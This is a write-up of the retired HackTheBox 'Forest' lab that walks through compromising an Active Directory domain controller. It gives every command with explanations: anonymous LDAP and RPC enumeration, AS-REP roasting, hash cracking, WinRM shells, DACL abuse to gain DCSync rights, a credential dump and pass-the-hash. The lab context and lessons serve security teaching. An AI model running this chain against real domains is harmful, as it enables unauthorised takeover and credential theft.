# Forest

```
Platform    : HackTheBox
OS          : Windows
Difficulty  : Easy
Category    : Active Directory
IP          : 10.129.57.96
```

---

## Summary

Initial access was gained through Kerberos pre-authentication abuse
(AS-REP Roasting) against a service account with a weak password,
enumerated via anonymous RPC and LDAP. That account turned out to
belong to a group with default, often-overlooked write permissions on
the domain object. Abusing those permissions (a WriteDACL right
inherited from Exchange group membership) allowed granting a new user
DCSync privileges, dumping every domain credential, and finally using
the Administrator's NT hash via Pass-the-Hash to gain full control of
the domain controller.

---

## Reconnaissance

```
nmap -p- -sS --min-rate 5000 -vvv -Pn --open 10.129.57.96 -oN scan.txt
nmap -p <open_ports> -sCV 10.129.57.96
```

- `-p-` scans all 65535 TCP ports instead of the default top 1000.
- `-sS` performs a SYN ("stealth") scan.
- `--min-rate 5000` forces Nmap to send packets no slower than 5000/s, speeding up the full-port sweep.
- `-Pn` skips host discovery (treats the host as up), useful when ICMP is filtered.
- `-sCV` on the second pass runs default NSE scripts (`-sC`) and version detection (`-sV`) only against the ports found open, which is faster than doing so against all 65535.

Key findings:

- **Port 53** — Simple DNS Plus
- **Port 88** — Kerberos (confirms this is a Domain Controller)
- **Port 135/445/139** — MSRPC / SMB / NetBIOS
- **Port 389/636/3268/3269** — LDAP / LDAPS / Global Catalog
- **Port 5985/47001** — WinRM
- **Port 9389** — AD Web Services

The combination of Kerberos, LDAP and multiple RPC/AD-related ports
immediately identified the target as a Windows domain controller for
`htb.local`, with SMB signing required and NTLM/Kerberos both in
play — a classic Active Directory enumeration target.

---

## Enumeration

### LDAP enumeration

Anonymous LDAP bind was allowed, so the directory could be queried
without credentials.

```
ldapsearch -x -H ldap://10.129.57.96 -b "DC=htb,DC=local" "(objectCategory=person)" sAMAccountName description
```

- `-x` uses simple (unauthenticated) bind instead of SASL.
- `-H` sets the LDAP server URI.
- `-b` sets the search base (the root of the domain naming context).
- The filter `(objectCategory=person)` restricts results to user objects.
- The trailing attribute names limit the returned fields to `sAMAccountName` and `description`.

This returned a large number of Exchange system/health-mailbox
accounts along with five real employee accounts:

```
sebastien
lucinda
andy
mark
santi
```

A second query against `(objectClass=group)` with the `member`
attribute mapped out group memberships, which later proved important
for the privilege-escalation path.

### RPC enumeration

Since `ldapsearch` didn't reveal the service account, and RPC does
not depend on LDAP's authentication policy, user enumeration was
retried anonymously over RPC:

```
rpcclient -U "" -N 10.129.57.96 -c "enumdomusers"
```

- `-U ""` connects with a blank/null username.
- `-N` skips the password prompt (null session).
- `-c "enumdomusers"` runs a single command (list domain users) instead of dropping into the interactive `rpcclient` shell.

This exposed one additional account not seen via LDAP:

```
svc-alfresco
```

The username list (`sebastien`, `lucinda`, `andy`, `mark`, `santi`,
`svc-alfresco`) was saved to `users.txt` for the next step.

---

## Foothold

### AS-REP Roasting

An initial AS-REP Roasting attempt against the LDAP-derived usernames
failed (none had Kerberos pre-authentication disabled). Adding
`svc-alfresco` to the list and retrying succeeded:

```
impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt -dc-ip 10.129.57.96
```

- `-no-pass` tells the tool not to prompt for a password, since this attack targets accounts with pre-authentication disabled.
- `-usersfile` supplies the list of candidate usernames to test.
- `-dc-ip` specifies the domain controller to query.

```
svc-alfresco doesn't require pre-authentication → AS-REP hash retrieved
```

The recovered `$krb5asrep$23$...` hash (etype 23 / RC4-HMAC) was
cracked with hashcat mode `18200`:

```
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

- `-m 18200` selects the Kerberos 5 AS-REP (etype 23) hash mode.
- `-a 0` selects a straight dictionary attack.
- The final argument is the wordlist used against the hash.

```
svc-alfresco : s3rvice
```

The credentials were validated and used to obtain a shell:

```
crackmapexec smb 10.129.57.96 -u 'svc-alfresco' -p 's3rvice'
evil-winrm -i 10.129.57.96 -u 'svc-alfresco' -p 's3rvice'
```

- `crackmapexec smb` checks a credential pair against the SMB service without fully authenticating an interactive session — a quick validation step.
- `evil-winrm` opens an authenticated PowerShell-based remote shell over WinRM (port 5985).

```
whoami
htb\svc-alfresco
```

---

## Privilege Escalation

Checking group membership as `svc-alfresco` revealed unusually
powerful indirect group memberships for a service account:

```
whoami /groups
```

This showed membership in `HTB\Privileged IT Accounts` and, via
nested Exchange group membership uncovered during LDAP enumeration,
in **Account Operators** and **Exchange Windows Permissions**.

- **Account Operators** grants the ability to create new domain users, but not to add them directly to protected/administrative groups (blocked by AdminSDHolder).
- **Exchange Windows Permissions** carries a default **WriteDACL** right over the domain object itself — a well-known Exchange misconfiguration that is not related to mailboxes at all, but to Active Directory permissions.

A new domain user was created using the Account Operators privilege:

```
net user hacker CrackMe123! /add /domain
```

- `/add` creates the account; `/domain` creates it in Active Directory rather than locally.

The WriteDACL right was then abused to grant this new user
**DCSync** rights (the ability to replicate directory data, normally
reserved for domain controllers) over the domain root:

```
impacket-dacledit -action write -rights FullControl -principal hacker -target-dn "DC=htb,DC=local" -dc-ip 10.129.57.96 htb.local/hacker:'CrackMe123!'
```

- `-action write` modifies the target object's DACL (as opposed to reading or restoring it).
- `-rights FullControl` grants full control (which encompasses DCSync's required extended rights) to the principal.
- `-principal` is the account receiving the new rights.
- `-target-dn` is the AD object whose ACL is being modified — here, the domain root, which is what makes DCSync possible.

With those rights in place, the entire NTDS database was dumped
remotely:

```
impacket-secretsdump htb.local/hacker:'CrackMe123!'@10.129.57.96
```

- This performs a DCSync-style extraction over the DRSUAPI protocol, pulling password hashes for every domain account as if the caller were a legitimate domain controller — no local access to `ntds.dit` required.

```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

The Administrator's NT hash was used directly in a Pass-the-Hash
attack, without ever needing the plaintext password:

```
evil-winrm -i 10.129.57.96 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

- `-H` supplies the NT hash directly for NTLM authentication, in place of `-p`/password.

```
whoami
htb\administrator
```

---

## Lessons Learned

- Anonymous LDAP binds and null RPC sessions can leak different,
  complementary slices of the user list — enumerate both, since one
  can reveal accounts the other misses (as happened with
  `svc-alfresco`).
- Service accounts are prime AS-REP Roasting targets: they're often
  created once, forgotten, and left with pre-authentication disabled
  or weak/legacy passwords.
- Nested group membership matters more than direct membership.
  `svc-alfresco` was never explicitly an admin, but inherited a
  dangerous `WriteDACL` right through an Exchange security group —
  a well-documented, default AD misconfiguration in environments
  where Exchange has been installed.
- Once any principal has `WriteDACL` over the domain object, DCSync
  rights (and therefore full domain compromise) are one `dacledit`
  command away — this right should be audited closely in any AD
  environment.
- NT hashes obtained via DCSync are directly usable with
  Pass-the-Hash; a plaintext password is never required once hashes
  are in hand.

---

<sub>Write-up published after machine retirement, per HackTheBox disclosure policy.</sub>
